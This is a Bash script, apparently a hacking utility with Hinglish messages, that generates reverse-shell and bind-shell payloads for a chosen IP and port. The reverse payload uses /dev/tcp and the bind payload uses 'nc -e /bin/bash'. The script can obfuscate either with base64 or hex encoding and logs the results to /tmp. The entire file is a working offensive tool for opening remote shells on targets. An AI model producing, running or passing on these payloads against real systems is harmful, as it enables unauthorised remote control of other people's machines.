#!/bin/bash
#!/bin/bash

# bash_payload_generator.sh
# Generates/obfuscates payloads with colorful summary

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Config
LOG_FILE="/tmp/payload_generator.log"

# Trap Ctrl+C
trap cleanup SIGINT

cleanup() {
    echo -e "\n${RED}Bhai, payload generator band!${NC}"
    exit 0
}

# Fancy header
display_header() {
    clear
    echo -e "${BLUE}=== Payload Generator ===${NC}"
    echo -e "${GREEN}Generating payloads${NC}\n"
}

# Display payloads
display_payloads() {
    display_header
    printf "${BLUE}%-20s %-15s %-30s${NC}\n" "Type" "Obfuscation" "Payload"
    printf "${BLUE}%s${NC}\n" "-------------------------------------------------"
    cat /tmp/payloads.txt | while IFS='|' read -r type obf payload; do
        printf "${YELLOW}%-20s %-15s %-30s${NC}\n" "$type" "$obf" "${payload:0:27}..."
    done
}

# Generate payload
generate_payload() {
    local type=$1 ip=$2 port=$3 obf=$4
    case $type in
        reverse)
            payload="/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
        bind)
            payload="nc -l -p $port -e /bin/bash"
            ;;
        *)
            return 1
            ;;
    esac
    case $obf in
        base64)
            payload=$(echo -n "$payload" | base64)
            ;;
        hex)
            payload=$(echo -n "$payload" | xxd -p | tr -d '\n')
            ;;
        none)
            ;;
        *)
            return 1
            ;;
    esac
    echo "$type|$obf|$payload" >> /tmp/payloads.txt
    echo "$(date '+%Y-%m-%d %H:%M:%S') $type $obf $payload" >> "$LOG_FILE"
    display_payloads
}

# Main
main() {
    if [ $# -ne 4 ]; then
        echo -e "${RED}Bhai, args de! Usage: $0 <type> <ip> <port> <obfuscation>${NC}"
        echo -e "${YELLOW}Example: $0 reverse 192.168.1.100 4444 base64${NC}"
        exit 1
    fi
    touch "$LOG_FILE" /tmp/payloads.txt
    echo -e "${GREEN}Generating payload...${NC}"
    generate_payload "$1" "$2" "$3" "$4" || {
        echo -e "${RED}Galat type ya obfuscation! Use reverse/bind, base64/hex/none${NC}"
        exit 1
    }
}

main "$@"